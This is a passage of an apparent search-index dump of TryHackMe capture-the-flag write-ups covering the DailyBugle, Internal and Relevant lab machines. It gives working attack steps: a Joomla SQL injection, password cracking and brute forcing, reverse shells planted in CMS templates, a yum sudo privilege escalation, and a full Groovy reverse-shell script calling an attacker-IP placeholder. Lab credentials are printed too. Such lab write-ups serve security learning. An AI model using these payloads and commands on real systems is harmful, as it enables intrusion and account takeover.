as root to the actual machine and not only the container we can do the following:</p> <p><code>chmod +s /mnt/root/bin/bash</code></p> <p>That command will set the SUID to the victim machine bash. Just exit the container and type <code>bash -p</code> to get access as root to the machine!</p>"},{"location":"TryHackMe%21/DailyBugle/","title":"DailyBugle","text":"<p>Link to the room</p>"},{"location":"TryHackMe%21/DailyBugle/#lets-start","title":"Let's start","text":"<p>The first question is about who robbed the bank, the answer is in the first article of the webpage: <code>spiderman</code> lul.</p> <p>Next the Joomla version, i just checked <code>/administrator/manifests/files/joomla.xml</code> to get that the version being used is <code>3.7.0</code>. Looking it in <code>searchsploit</code> looks like we can work with that: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit joomla 3.7.0          \n---------------------------------------------- ---------------------------------\n Exploit Title                                |  Path\n---------------------------------------------- ---------------------------------\nJoomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt\nJoomla! Component Easydiscuss &lt; 4.0.21 - Cros | php/webapps/43488.txt\n---------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre></p> <p>According with the exploit information is a blind sql injection. Lets use <code>sqlmap</code> then as it is described:</p> <p><pre><code>sqlmap -u \"http://&lt;MACHINE_IP&gt;/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n</code></pre> After a while i was tired of waiting and used this https://github.com/stefanlucas/Exploit-Joomla and got the admin credentials: <pre><code>[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''] \n</code></pre></p> <p>To check the hash type i used <code>hashid</code>: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'\nAnalyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'\n[+] Blowfish(OpenBSD) \n[+] Woltlab Burning Board 4.x \n[+] bcrypt\n</code></pre> I could have used <code>hashcat</code> with the <code>-m 3200</code> parameter but i ended up using <code>john --wordlist=/home/kali/rockyou.txt hashes.txt</code> and after a while i got the password: <code>spiderman123</code> cool.</p>"},{"location":"TryHackMe%21/DailyBugle/#getting-access","title":"Getting access","text":"<p>Now i can login to the admin page but what i really want is a reverse shell. If i go to templates and click in one of the available one to edit the <code>index.php</code> file (Url of the file i edited: http:///administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=aG9tZQ==) with a reverse shell. Now setting up <code>netcat</code>: <code>nc -lnvp 8080</code> and visiting http:///templates/beez3/ gave me a shell nice."},{"location":"TryHackMe%21/DailyBugle/#privesc-to-user","title":"Privesc to user","text":"<p>Now we need to get privs, i ran <code>linpeas</code> and some maunal enumeration and got some interesting things: <pre><code>[+] Checking sudo tokens\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens\n/proc/sys/kernel/yama/ptrace_scope is enabled (0)\n\n[+] Users with console\njjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\n\n[+] Files with capabilities (limited to 50):\n/usr/bin/newgidmap = cap_setgid+ep\n/usr/bin/newuidmap = cap_setuid+ep\n/usr/bin/ping = cap_net_admin,cap_net_raw+p\n/usr/sbin/clockdiff = cap_net_raw+p\n/usr/sbin/suexec = cap_setgid,cap_setuid+ep\n\n[+] Unexpected in root\n/.autorelabel\n\n[+] Mails (limit 50)\n9244504    0 -rw-rw----   1 jjameson mail            0 Dec 14  2019 /var/mail/jjameson\n9244504    0 -rw-rw----   1 jjameson mail            0 Dec 14  2019 /var/spool/mail/jjameson\n\nbash-4.2$ hostnamectl\n   Static hostname: dailybugle\n         Icon name: computer-vm\n           Chassis: vm\n        Machine ID: 4fc91dda78404e5d84ba62e3cbe3a722\n           Boot ID: e823ad0ff3564c759435c805bf34f7b2\n    Virtualization: xen\n  Operating System: CentOS Linux 7 (Core)\n       CPE OS Name: cpe:/o:centos:centos:7\n            Kernel: Linux 3.10.0-1062.el7.x86_64\n      Architecture: x86-64\n</code></pre></p> <p>But what was really helpful was the <code>/var/www/html/configuration.php</code> file and this database related variables: <pre><code>public $dbtype = 'mysqli';\npublic $host = 'localhost';\npublic $user = 'root';\npublic $password = 'nv5uz9r3ZEDzVjNu';\npublic $db = 'joomla';\npublic $dbprefix = 'fb9j5_';\npublic $live_site = '';\npublic $secret = 'UAMBRWzHO3oFPmVC';\n</code></pre></p> <p>I tried that password with the <code>jjameson</code> user and it worked yey. So now we have the user credentials: <code>jjameson:nv5uz9r3ZEDzVjNu</code> and we can get the flag: <pre><code>[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt \n**********************\n</code></pre></p>"},{"location":"TryHackMe%21/DailyBugle/#privesc-to-root","title":"Privesc to root","text":"<p>Well the first thing i tried was <code>sudo -l</code> and got something funny:</p> <p><pre><code>User jjameson may run the following commands on dailybugle:\n    (ALL) NOPASSWD: /usr/bin/yum\n</code></pre> So i can use <code>yum</code> as <code>sudo</code>. According with https://gtfobins.github.io/gtfobins/yum/ that is exploitable so i tried the custom plugin method:</p> <p><pre><code>TF=$(mktemp -d)\ncat &gt;$TF/x&lt;&lt;EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat &gt;$TF/y.conf&lt;&lt;EOF\n[main]\nenabled=1\nEOF\n\ncat &gt;$TF/y.py&lt;&lt;EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n</code></pre> After executing that i got a root shell and was able to get the flag: <pre><code>sh-4.2# cat /root/root.txt \n**********************\n</code></pre></p>"},{"location":"TryHackMe%21/Internal/","title":"Internal","text":"<p>Link to the room (Add <code>internal.thm</code> to <code>hosts</code> file before start!)</p>"},{"location":"TryHackMe%21/Internal/#lets-start","title":"Let's start!","text":"<p>First lets try to get what ports are open:</p> <pre><code>------------------------------------------------------------\n        Threader 3000 - Multi-threaded Port Scanner          \n                       Version 1.0.7                    \n                   A project by The Mayor               \n------------------------------------------------------------\nEnter your target IP address or URL here: internal.thm\n------------------------------------------------------------\nScanning target internal.thm\nTime started: 2021-05-14 13:09:55.201429\n------------------------------------------------------------\nPort 22 is open\nPort 80 is open\nPort scan completed in 0:00:20.447794\n------------------------------------------------------------\n</code></pre> <p>Nice, now the typical <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/THM/Internal]\n\u2514\u2500$ nmap -sV -sC -p22,80 -oN nmapScan.txt internal.thm\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 13:12 EDT\nNmap scan report for internal.thm\nHost is up (0.052s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.13 seconds\n</code></pre> <p>Just <code>ssh</code> and a default apache page... ok, lets start by checking that web.</p>"},{"location":"TryHackMe%21/Internal/#webpage-enumeration","title":"Webpage enumeration","text":"<p>First thing i want to try is gobuster to check for interesting directories:</p> <pre><code>===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://internal.thm/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2021/05/14 13:15:25 Starting gobuster in directory enumeration mode\n===============================================================\n/blog                 (Status: 301) [Size: 313] [--&gt; http://internal.thm/blog/]\n/wordpress            (Status: 301) [Size: 318] [--&gt; http://internal.thm/wordpress/]\n/javascript           (Status: 301) [Size: 319] [--&gt; http://internal.thm/javascript/]\n/phpmyadmin           (Status: 301) [Size: 319] [--&gt; http://internal.thm/phpmyadmin/]\n===============================================================\n2021/05/14 13:20:36 Finished\n===============================================================\n</code></pre> <p>A blog with wordpress and access to the phpmyadmin page. The phpmyadmin looks like doesn't allow login without password so let's check Wordpress. Let's use <code>wpscan</code> and <code>nmap</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sV --script http-wordpress-enum --script-args root=\"/blog\" internal.thm \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 13:48 EDT\nNmap scan report for internal.thm (internal.thm)\nHost is up (0.056s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-wordpress-enum: \n| Search limited to top 100 themes/plugins\n|   themes\n|     twentyseventeen 2.3\n|   plugins\n|_    akismet\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.90 seconds\n</code></pre> <p>To be honest i first used <code>wpscan</code> to check for themes or installed plugins to check if some of them were outdated but wasn't really helpful so i tried a brute force attack with <code>rockyou</code> knowing that <code>xmlrpc</code> was enabled. Checking through the Wordpress i found that the admin user was called admin, yeah original, so we can just specify this as the username we want the password from:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ wpscan --url http://internal.thm/blog/ --passwords rockyou.txt --usernames admin\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://internal.thm/blog/ [internal.thm]\n[+] Started: Fri May 14 13:53:36 2021\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://internal.thm/blog/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;\n |  - http://internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/\n | Last Updated: 2021-04-27T00:00:00.000Z\n | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt\n | [!] The version is out of date, the latest version is 2.7\n | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:02 &lt;=============================================================================&gt; (137 / 137) 100.00% Time: 00:00:02\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - admin / my2boys                                                                                                                                 \nTrying admin / princess7 Time: 00:02:19 &lt;                                                                          &gt; (3885 / 14348277)  0.02%  ETA: ??:??:??\n\n[!] Valid Combinations Found:\n | Username: admin, Password: my2boys\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Fri May 14 13:56:06 2021\n[+] Requests Done: 4058\n[+] Cached Requests: 5\n[+] Data Sent: 2.045 MB\n[+] Data Received: 2.647 MB\n[+] Memory used: 255.074 MB\n[+] Elapsed time: 00:02:30\n</code></pre> <p>Oh boy, oh boy! That actually worked cool! So we have admin access to Wordpress now with: <code>admin:my2boys</code></p>"},{"location":"TryHackMe%21/Internal/#wordpress-dashboard","title":"Wordpress dashboard","text":"<p>Once here we can really just get a reverse shell but i found something. There is a private post in the Wordpress that contains something really interesting:</p> <pre><code>To-Do\n\nDon't forget to reset Will's credentials. william:arnold147\n</code></pre> <p>So more credentials nice!: <code>william:arnold147</code> Before trying to get a reverse shell i will try the credentials we already know in <code>ssh</code>, remember that it was open. After some trying for a while i wasn't able to use them to login through <code>ssh</code>, sad, but hey we still can get a reverse shell so let's go for it.</p>"},{"location":"TryHackMe%21/Internal/#reverse-shell","title":"Reverse shell","text":"<p>To get a reverse shell from Wordpress i will go to the theme editor and change the 404 page template with php reverse shell code. Once that is done, i setup my netcat listenner: <code>nc -lnvp 8080</code> and tried to access a non existant article in wordpress, i noticed that the <code>/wordpress</code> directory gobuster found just do that so let's go:</p> <pre><code>\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.9.82.69] from (UNKNOWN) [internal.thm] 59962\nLinux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 18:22:28 up  1:27,  0 users,  load average: 0.00, 0.02, 0.04\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$\n</code></pre> <p>To stabilize the shell execute <code>python -c 'import pty; pty.spawn(\"/bin/bash\")'</code>, then <code>ctrl-z</code> to suspend the process, execute <code>stty raw -echo; fg</code>, hit enter to get the reverse shell prompt again and lastly just <code>export TERM=xterm</code>.</p>"},{"location":"TryHackMe%21/Internal/#privesc-to-user","title":"Privesc to user","text":"<p>First thing i want to check is if the wordpress installation has something for me, this is what i got:</p> <pre><code>// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wordpress' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'wordpress' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'wordpress123' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n</code></pre> <p>I checked the database in the <code>/phpmyadmin</code> directory using this credentials but nothing interesting there. No interesting <code>SUID</code> files neither, and <code>linpeas</code> wasn't helping neither. After some manual enumeration i found something in the <code>opt</code> directory:</p> <pre><code>www-data@internal:/opt$ cat wp-save.txt \nBill,\n\nAubreanna needed these credentials for something later.  Let her know you have them and where they are.\n\naubreanna:bubb13guM!@#123\n</code></pre> <p>So we got the user credentials: <code>aubreanna:bubb13guM!@#123</code> Just login to the accound and get the flag: <pre><code>aubreanna@internal:~$ cat /home/aubreanna/user.txt \nTHM{*******************}\n</code></pre></p>"},{"location":"TryHackMe%21/Internal/#privesc-to-root","title":"Privesc to root","text":"<p>First thing, during the first enumeration phase as www-data i couldn't really find something of interest to get root using exploits for outdated things so we will have to continue with the manual enumeration. Let's check our groups:</p> <p><pre><code>aubreanna@internal:~$ id\nuid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)\n</code></pre> That adm group will allow me to read logs so we can try that later if necessary. I also saw a <code>jenkins.txt</code> file in our <code>home</code> folder:</p> <pre><code>Internal Jenkins service is running on 172.17.0.2:8080\n</code></pre> <p>I will use <code>ssh</code> tunneling to access this from my machine, first:</p> <pre><code>ssh -N -p 22 aubreanna@internal.thm -L 2000:localhost:8080\n</code></pre> <p>Use aubreanna credentials and the jenkins server is now available from <code>localhost:2000</code>. After some basic enumeration a used metasploit to try a bruteforce attack in the default admin user: <pre><code>msf&gt; use auxiliary/scanner/http/jenkins_login\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set RHOSTS localhost\nRHOSTS =&gt; localhost\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set TARGETURI /\nTARGETURI =&gt; /\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set RPORT 2000\nRPORT =&gt; 2000\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set BLANK_PASSWORDS true\nBLANK_PASSWORDS =&gt; true\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set PASSWORD \"\"\nPASSWORD =&gt; \nmsf6 auxiliary(scanner/http/jenkins_login) &gt; set PASS_FILE /home/kali/rockyou.txt\nPASS_FILE =&gt; /home/kali/rockyou.txt\nmsf6 auxiliary(scanner/http/jenkins_login) &gt; run\n...\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:michael (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:ashley (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:qwerty (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:111111 (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:iloveu (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:000000 (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:michelle (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:tigger (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:sunshine (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:chocolate (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:password1 (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:soccer (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:anthony (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:friends (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:butterfly (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:purple (Incorrect)\n[-] 127.0.0.1:2000 - LOGIN FAILED: root:angel (Incorrect)\n.....\n127.0.0.1:2000 - Login Successful: admin:spongebob &lt;---\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre></p>"},{"location":"TryHackMe%21/Internal/#another-reverse-shell","title":"Another reverse shell?","text":"<p>So the jenkins credentials are <code>admin:spongebob</code> cool. Let's get another reverse shell, just going to <code>Manage Jenkins</code> and then clicking on <code>Script Console</code> will send me to the <code>/script</code> path where using <code>Revsh.groovy</code> alongside a netcat listenner will give a shell:</p> <pre><code>String host=\"ATACKER_IP\";\nint port=8080;\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080           \nlistening on [any] 8080 ...\nconnect to [10.9.82.69] from (UNKNOWN) [internal.thm] 48720\nls\nbin\nboot\n...\n</code></pre> <p>After the shell is stabilized let's start enumerating. Turns out this guys love the <code>opt</code> folder because again there is something interesting in there. This <code>note.txt</code> file contains this:</p> <pre><code>Aubreanna,\n\nWill wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you \nneed access to the root user account.\n\nroot:tr0ub13guM!@#123\n</code></pre> <p>Can this be true? That easy? Lets try to <code>ssh</code> into the machine with that credentials (According with <code>linpeas</code> root access is allowed): <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh root@internal.thm\nroot@internal.thm's password:\n....\nLast login: Mon Aug  3 19:59:17 2020 from 10.6.2.56\nroot@internal:~#\n</code></pre></p> <p>It worked omg! Let's get the flag:</p> <pre><code>root@internal:~# cat /root/root.txt \nTHM{*******************}\n</code></pre>"},{"location":"TryHackMe%21/Relevant/","title":"Relevant","text":"<p>Link to the room</p>"},{"location":"TryHackMe%21/Relevant/#enumeration","title":"Enumeration","text":""},{"location":"TryHackMe%21/Relevant/#lets-start-with-nmap-and-threader3000","title":"Lets start with nmap and threader3000","text":"<p>I will use <code>threader300</code> to check all open ports before running <code>nmap</code> to reduce scan times: <pre><code>------------------------------------------------------------\n        Threader 3000 - Multi-threaded Port Scanner          \n                       Version 1.0.7                    \n                   A project by The Mayor               \n------------------------------------------------------------\nEnter your target IP address or URL here: &lt;MACHINE_IP&gt;\n------------------------------------------------------------\nScanning target &lt;MACHINE_IP&gt;\nTime started: 2021-05-07 13:03:58.365964\n------------------------------------------------------------\nPort 139 is open\nPort 80 is open\nPort 135 is open\nPort 445 is open\nPort 3389 is open\nPort 49663 is open\nPort 49667 is open\nPort 49669 is open\nPort scan completed in 0:01:39.791011\n</code></pre></p> <pre><code>nmap -sV -sC -p139,80,135,445,3389,49663,49667,49669 -oN nmapScan.txt &lt;MACHINE_IP&gt;\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 13:07 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.20s latency).\n\nPORT      STATE SERVICE        VERSION\n80/tcp    open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp   open  msrpc          Microsoft Windows RPC\n139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n3389/tcp  open  ms-wbt-server?\n| rdp-ntlm-info: \n|   Target_Name: RELEVANT\n|   NetBIOS_Domain_Name: RELEVANT\n|   NetBIOS_Computer_Name: RELEVANT\n|   DNS_Domain_Name: Relevant\n|   DNS_Computer_Name: Relevant\n|   Product_Version: 10.0.14393\n|_  System_Time: 2021-05-07T17:09:00+00:00\n| ssl-cert: Subject: commonName=Relevant\n| Not valid before: 2021-05-06T16:58:58\n|_Not valid after:  2021-11-05T16:58:58\n|_ssl-date: 2021-05-07T17:09:40+00:00; +1s from scanner time.\n49663/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n49667/tcp open  msrpc          Microsoft Windows RPC\n49669/tcp open  msrpc          Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h24m01s, deviation: 3h07m50s, median: 0s\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: Relevant\n|   NetBIOS computer name: RELEVANT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-05-07T10:09:02-07:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-07T17:09:03\n|_  start_date: 2021-05-07T16:59:34\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 123.79 seconds\n</code></pre> <p>So <code>RDP</code> server, 2 web servers and <code>SMB</code>. The <code>RDP</code> server looks like is protected with a password and both web server looks like the default page of ISS (<code>TRACE</code> method allowed but not much more), so lets check <code>SMB</code></p>"},{"location":"TryHackMe%21/Relevant/#smb","title":"SMB","text":"<p>I will use <code>enum4linux</code> to enum the service to get additional information to the already gathered by <code>nmap</code>: <pre><code>enum4linux -a -u guest -w WORKGROUP &lt;MACHINE_IP&gt;                      255 \u2a2f\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May  7 12:09:27 2021\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... &lt;MACHINE_IP&gt;\nRID Range ........ 500-550,1000-1050\nUsername ......... 'guest'\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ===================================================== \n|    Enumerating Workgroup/Domain on &lt;MACHINE_IP&gt;    |\n ===================================================== \n[+] Got domain/workgroup name: WORKGROUP\n\n ============================================= \n|    Nbtstat Information for &lt;MACHINE_IP&gt;    |\n ============================================= \nLooking up status of &lt;MACHINE_IP&gt;\nNo reply from &lt;MACHINE_IP&gt;\n\n ====================================== \n|    Session Check on &lt;MACHINE_IP&gt;    |\n ====================================== \n[+] Server &lt;MACHINE_IP&gt; allows sessions using username 'guest', password ''\n\n ============================================ \n|    Getting domain SID for &lt;MACHINE_IP&gt;    |\n ============================================ \nDomain Name: WORKGROUP\nDomain Sid: (NULL SID)\n[+] Can't determine if host is part of domain or part of a workgroup\n\n ======================================= \n|    OS information on &lt;MACHINE_IP&gt;    |\n ======================================= \nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for &lt;MACHINE_IP&gt; from smbclient: \n[+] Got OS info for &lt;MACHINE_IP&gt; from srvinfo:\n    &lt;MACHINE_IP&gt;  Wk Sv NT SNT         \n    platform_id     :   500\n    os version      :   10.0\n    server type     :   0x9003\n\n ========================================== \n|    Share Enumeration on &lt;MACHINE_IP&gt;    |\n ========================================== \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    nt4wrksv        Disk      \nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on &lt;MACHINE_IP&gt;\n//&lt;MACHINE_IP&gt;/ADMIN$   Mapping: DENIED, Listing: N/A\n//&lt;MACHINE_IP&gt;/C$   Mapping: DENIED, Listing: N/A\n//&lt;MACHINE_IP&gt;/IPC$ [E] Can't understand response:\nNT_STATUS_INVALID_INFO_CLASS listing \\*\n//&lt;MACHINE_IP&gt;/nt4wrksv Mapping: OK, Listing: OK\n\n ===================================================== \n|    Password Policy Information for &lt;MACHINE_IP&gt;    |\n ===================================================== \n[E] Unexpected error from polenum:\n\n\n[+] Attaching to &lt;MACHINE_IP&gt; using guest\n\n[+] Trying protocol 139/SMB...\n\n    [!] Protocol failed: Cannot request session (Called Name:&lt;MACHINE_IP&gt;)\n\n[+] Trying protocol 445/SMB...\n\n    [!] Protocol failed: rpc_s_access_denied\n\n\n[E] Failed to get password policy with rpcclient\n\n\n =============================== \n|    Groups on &lt;MACHINE_IP&gt;    |\n =============================== \n\n[+] Getting builtin groups:\n\n[+] Getting 